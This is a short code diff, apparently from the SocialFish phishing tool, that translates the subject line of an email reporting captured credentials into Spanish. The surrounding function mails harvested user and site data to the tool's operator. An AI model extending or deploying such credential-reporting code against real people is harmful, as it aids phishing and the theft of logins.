@@ -50,7 +50,7 @@ def objsmtp():
 
 def send_mail(msg, fish):
 
-    msg_mail = 'Subject: Social Fish - Credentials found: {user}\r\n\r\n'.format(user=msg[0])
+    msg_mail = 'Subject: Social Fish - Informacion encontrada: {user}\r\n\r\n'.format(user=msg[0])
     msg_mail += '''
 {site}
 {user}
